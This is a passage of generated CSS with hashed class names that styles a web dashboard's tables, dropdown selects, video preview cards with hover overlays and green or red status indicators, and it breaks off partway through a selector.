    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .qXkrE-U7pm6zMVTQkNsim svg,
    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 ._30CWiBAox7_rDMza7OyQ4X svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .qXkrE-U7pm6zMVTQkNsim svg,
    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .qXkrE-U7pm6zMVTQkNsim path,
    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 ._30CWiBAox7_rDMza7OyQ4X svg,
    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 ._30CWiBAox7_rDMza7OyQ4X path {
        fill: #21a67a
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .AzdYblUlMaeEAVsyeO4w8,
    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 ._5CLc7hO4HvOF9ChembPLf {
        color: #e9162b;
        display: flex;
        align-items: center
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .AzdYblUlMaeEAVsyeO4w8 svg,
    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 ._5CLc7hO4HvOF9ChembPLf svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .AzdYblUlMaeEAVsyeO4w8 svg,
    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .AzdYblUlMaeEAVsyeO4w8 path,
    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 ._5CLc7hO4HvOF9ChembPLf svg,
    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 ._5CLc7hO4HvOF9ChembPLf path {
        fill: #e9162b
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77._2sBeQbEs4vdT2tcpBb_Hm6 {
        white-space: nowrap
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77._2sBeQbEs4vdT2tcpBb_Hm6 span {
        display: inline-flex
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3x4i4ldxO53hEAOuWvAxnX {
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3-XGxRaVBYfmQni2r_af1E {
        position: absolute;
        top: 0;
        right: -20px;
        bottom: 0;
        left: -20px;
        background: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 0 0 8px 8px;
        z-index: 100
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3-XGxRaVBYfmQni2r_af1E .ey9617brPVHuNl9HbvkN9 {
        display: flex;
        flex-direction: column;
        align-items: center
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3-XGxRaVBYfmQni2r_af1E .ey9617brPVHuNl9HbvkN9 ._1V3at1jJJCvPGKK3yk-6Oj {
        font-size: 20px;
        font-weight: 600;
        color: #fff
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3-XGxRaVBYfmQni2r_af1E .ey9617brPVHuNl9HbvkN9 ._1dok1FzZcCOM1tNO-A2EOB {
        margin-top: 20px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3-XGxRaVBYfmQni2r_af1E .ey9617brPVHuNl9HbvkN9 ._1XmB3rMY1JUP5FGKY65s4_ {
        margin-top: 30px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3-XGxRaVBYfmQni2r_af1E .ey9617brPVHuNl9HbvkN9 ._2Wk1GoAlvUjoXa9vYUOogd {
        color: #fff;
        margin-top: 10px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3-XGxRaVBYfmQni2r_af1E .ey9617brPVHuNl9HbvkN9 ._2Wk1GoAlvUjoXa9vYUOogd span {
        display: inline-block;
        color: #0080f7
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._1kMF-gpD7TBTmQGI5WfQyE {
        padding: 20px 0;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._1kMF-gpD7TBTmQGI5WfQyE div {
        cursor: pointer
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._1kMF-gpD7TBTmQGI5WfQyE span {
        color: #006fe3;
        font-weight: 600;
        display: flex;
        justify-content: center;
        cursor: pointer
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3mBwAln4MJ3POY3ZEDmWlJ {
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO {
        margin-top: 20px;
        padding-bottom: 20px
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._2gotHy1m9UtmjFxOO1ccqL {
        display: grid;
        grid-template-columns: 1fr 1fr 1fr;
        gap: 24px;
        margin-bottom: 24px
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._2brzxkt5bkYuc0QO0KqJk- {
        margin-bottom: 12px;
        color: #262626;
        font-size: 18px;
        line-height: 26px;
        font-weight: 500
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._3y_HcuzIdAG5okHCxuyuLa {
        display: flex;
        margin-bottom: 20px
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._3y_HcuzIdAG5okHCxuyuLa ._2ToA2q3EWsW8tVsmvDxQuD {
        margin-right: 24px
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._3y_HcuzIdAG5okHCxuyuLa ._2ToA2q3EWsW8tVsmvDxQuD ._2FYAvuMuWith_qV7tS6iMC {
        position: relative
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._3y_HcuzIdAG5okHCxuyuLa ._2ToA2q3EWsW8tVsmvDxQuD ._2FYAvuMuWith_qV7tS6iMC ._3a9kLJb5suXt9KsvldgOue {
        position: absolute;
        right: 2px;
        top: 50%;
        transform: translateY(-50%);
        display: inline-flex;
        z-index: 1
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._3y_HcuzIdAG5okHCxuyuLa ._2ToA2q3EWsW8tVsmvDxQuD select {
        border: 1px solid #9d9d9d;
        height: 32px;
        padding: 0px 11px;
        display: flex;
        min-width: 100px;
        background: #ffffff;
        cursor: pointer;
        justify-content: space-between;
        align-items: center;
        border-radius: 4px;
        font-size: 14px;
        min-width: 177px;
        z-index: 3;
        background: transparent
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._3y_HcuzIdAG5okHCxuyuLa ._2ToA2q3EWsW8tVsmvDxQuD ._3DncrEAfOcYMaaL4hMjHs4 {
        margin-bottom: 6px;
        color: rgba(0, 0, 0, 0.85)
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._36t4Cio8F_xcjJvM-lv_Vo {
        display: flex;
        text-align: center !important;
        flex-direction: column;
        justify-content: center
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._36t4Cio8F_xcjJvM-lv_Vo>div {
        text-align: center;
        cursor: pointer;
        color: var(--ah-secondary)
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._36t4Cio8F_xcjJvM-lv_Vo ._2BJA5aAKyfGovIftKIs4Qw {
        text-align: center
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._36t4Cio8F_xcjJvM-lv_Vo ._2BJA5aAKyfGovIftKIs4Qw svg {
        height: 16px !important;
        cursor: pointer
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._36t4Cio8F_xcjJvM-lv_Vo ._2BJA5aAKyfGovIftKIs4Qw svg path {
        fill: var(--ah-secondary)
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._2Edpm7Cj1YjPkYpiJntJql {
        position: absolute;
        width: 100%;
        height: 100%;
        z-index: 99;
        display: flex;
        align-items: center;
        flex-direction: column;
        justify-content: center
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._2Edpm7Cj1YjPkYpiJntJql svg {
        height: 16px !important;
        color: #fff
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._2Edpm7Cj1YjPkYpiJntJql .GO31AVHK_dV6j5WnjjT2p {
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.7);
        position: absolute;
        width: 100%;
        border-radius: 6px;
        z-index: 2
    }

    ._2CGEifP4ak4nAn7GHWBaRh ._3yVNa1n-mI5uWDu5_dqbAO ._2Edpm7Cj1YjPkYpiJntJql>div:not(.GO31AVHK_dV6j5WnjjT2p) {
        position: relative;
        z-index: 4;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        gap: 12px
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl {
        position: relative;
        border-radius: 4px;
        overflow: hidden;
        background: lightgray;
        cursor: pointer
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl>* {
        cursor: pointer
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl video {
        width: 100% !important;
        height: 420px !important;
        object-fit: cover !important;
        overflow: hidden !important
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl .v5AwoRwZi5HfEtYwNAz3P {
        border-radius: 50%;
        width: 40px;
        height: 40px;
        background: rgba(255, 255, 255, 0.2);
        overflow: hidden;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy {
        position: absolute;
        bottom: 0;
        left: 0;
        right: 0;
        z-index: 9;
        background: rgba(0, 0, 0, 0.7);
        padding-top: 8px;
        padding-bottom: 8px
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy ._3rHgYhgpEtwRphspuWnzCf {
        display: flex
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy ._1TAa6apDWhcqHSCUzJ_4g {
        width: 100%
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy ._1TAa6apDWhcqHSCUzJ_4g>div {
        text-align: center;
        color: #fff
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy ._2a-fuFVSRkrOihnLG4aHaL {
        overflow: hidden;
        max-height: 0;
        transition: 0.3s;
        padding-left: 12px;
        padding-right: 12px
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy ._2a-fuFVSRkrOihnLG4aHaL ._1aXamVrRc68VYDZXKrwMSi {
        display: flex;
        align-items: center;
        color: #fff;
        margin-bottom: 6px
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy ._2a-fuFVSRkrOihnLG4aHaL ._1aXamVrRc68VYDZXKrwMSi img {
        margin-right: 8px;
        min-width: 32px;
        max-width: 32px;
        height: 32px;
        border-radius: 50%;
        overflow: hidden;
        object-fit: cover
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy ._2a-fuFVSRkrOihnLG4aHaL ._1aXamVrRc68VYDZXKrwMSi span {
        color: #fff;
        display: block;
        display: -webkit-box !important;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis;
        word-break: break-all
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy ._2a-fuFVSRkrOihnLG4aHaL .DT3c4ZE4eBBZGGIqsJKj {
        color: #fff;
        display: block;
        display: -webkit-box !important;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis;
        margin-bottom: 6px;
        word-break: break-all
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy ._2a-fuFVSRkrOihnLG4aHaL ._2-TEvOoabVABpMTO0zPlmT {
        display: flex
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl ._2WFDUDVfo7o7H6PdLTVVMy ._2a-fuFVSRkrOihnLG4aHaL ._2-TEvOoabVABpMTO0zPlmT>span {
        margin-right: 8px;
        display: inline-block;
        color: #fff
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl:hover .v5AwoRwZi5HfEtYwNAz3P {
        display: none
    }

    ._22nQKTam9HvU7oITEsnrkX ._2qc_yjVufW2F2-X0WPfeRl:hover ._2WFDUDVfo7o7H6PdLTVVMy ._2a-fuFVSRkrOihnLG4aHaL {
        max-height: 200px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n {
        margin-top: 20px;
        padding-bottom: 20px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._3ZQtOOvzXw8Jfjm_FBaZ7q {
        display: flex;
        margin-bottom: 20px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._3ZQtOOvzXw8Jfjm_FBaZ7q ._1aVzfZzTUlDG5CbF7CNUNB {
        margin-right: 24px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._3ZQtOOvzXw8Jfjm_FBaZ7q ._1aVzfZzTUlDG5CbF7CNUNB ._21XK9Xgt0_0Ls1axh0w88Y {
        position: relative
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._3ZQtOOvzXw8Jfjm_FBaZ7q ._1aVzfZzTUlDG5CbF7CNUNB ._21XK9Xgt0_0Ls1axh0w88Y ._3wI1QrylXZRGFnc4aG-XMc {
        position: absolute;
        right: 2px;
        top: 50%;
        transform: translateY(-50%);
        display: inline-flex;
        z-index: 1
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._3ZQtOOvzXw8Jfjm_FBaZ7q ._1aVzfZzTUlDG5CbF7CNUNB select {
        border: 1px solid #9d9d9d;
        height: 32px;
        padding: 0px 11px;
        display: flex;
        min-width: 100px;
        background: #ffffff;
        cursor: pointer;
        justify-content: space-between;
        align-items: center;
        border-radius: 4px;
        font-size: 14px;
        min-width: 177px;
        z-index: 3;
        background: transparent
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._3ZQtOOvzXw8Jfjm_FBaZ7q ._1aVzfZzTUlDG5CbF7CNUNB ._1uxXqQnJDtyM9NZv0-99oI {
        margin-bottom: 6px;
        color: rgba(0, 0, 0, 0.85)
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 {
        display: table;
        width: 100%
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._3Uacg1hXjGHZlCMCBRq3w {
        display: table-header-group
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._3Uacg1hXjGHZlCMCBRq3w ._2Zxy5Lj2x4imbqjaL47JgY {
        display: table-row
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._3Uacg1hXjGHZlCMCBRq3w ._2Zxy5Lj2x4imbqjaL47JgY ._1keopzlo-vS8SSGZ4p7gr9 {
        display: table-cell;
        padding: 13px 10px;
        background: #e9e9e9;
        font-weight: 500
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._3Uacg1hXjGHZlCMCBRq3w ._2Zxy5Lj2x4imbqjaL47JgY ._1keopzlo-vS8SSGZ4p7gr9._10MapJcXFrFUlL7htMv2-B {
        width: 35%
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._3Uacg1hXjGHZlCMCBRq3w ._2Zxy5Lj2x4imbqjaL47JgY ._1keopzlo-vS8SSGZ4p7gr9._3Oavm9fBok0xij0VcNGzoT {
        width: 15%
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._3Uacg1hXjGHZlCMCBRq3w ._2Zxy5Lj2x4imbqjaL47JgY ._1keopzlo-vS8SSGZ4p7gr9._1-QN5ThYAYyOFaNTDn01LJ {
        width: 25%
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._3Uacg1hXjGHZlCMCBRq3w ._2Zxy5Lj2x4imbqjaL47JgY ._1keopzlo-vS8SSGZ4p7gr9._3QRTaUuH1o1sUheEstF012 {
        width: 15%
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._3Uacg1hXjGHZlCMCBRq3w ._2Zxy5Lj2x4imbqjaL47JgY ._1keopzlo-vS8SSGZ4p7gr9:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._3Uacg1hXjGHZlCMCBRq3w ._2Zxy5Lj2x4imbqjaL47JgY ._1keopzlo-vS8SSGZ4p7gr9:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg {
        display: table-header-group
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY {
        display: table-row
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- {
        display: table-cell;
        padding: 14px 10px;
        text-align: left;
        vertical-align: middle;
        border-bottom: 1px solid #e2e4e5
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH-.ymc4-YeJXPvEJuAaFt9tS * {
        cursor: pointer
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- .hx5Yd1VSuIeat4C9JXQDM {
        width: 32px;
        height: 32px;
        border-radius: 4px;
        overflow: hidden
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._3LIwm3ArR2ymOUITPC8YMH {
        max-width: 280px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        min-height: 24px;
        margin-left: 16px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._3LIwm3ArR2ymOUITPC8YMH:hover {
        color: var(--ah-primary-hover)
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._1zrNLbavdd4pq9KYJrCtjU {
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH-._3g-WCca3lNGsOqnwQpS2G_>span {
        display: flex;
        align-items: center
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH-._3g-WCca3lNGsOqnwQpS2G_>span span {
        display: inline-flex;
        margin-right: 5px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- .XQu42gQaiq6H2STDJ09c_,
    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._2ma-AhsEdwl8mr7RxarkEo {
        color: #21a67a;
        display: flex;
        align-items: center
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- .XQu42gQaiq6H2STDJ09c_ svg,
    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._2ma-AhsEdwl8mr7RxarkEo svg {
        margin-left: 5px;
        width: 8px !important
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- .XQu42gQaiq6H2STDJ09c_ svg,
    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- .XQu42gQaiq6H2STDJ09c_ path,
    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._2ma-AhsEdwl8mr7RxarkEo svg,
    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._2ma-AhsEdwl8mr7RxarkEo path {
        fill: #21a67a
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- .ajThxwInFkMXbGOpwMoqk,
    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._37GSP70D8mbcpPcjnjhH5u {
        color: #e9162b;
        display: flex;
        align-items: center
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- .ajThxwInFkMXbGOpwMoqk svg,
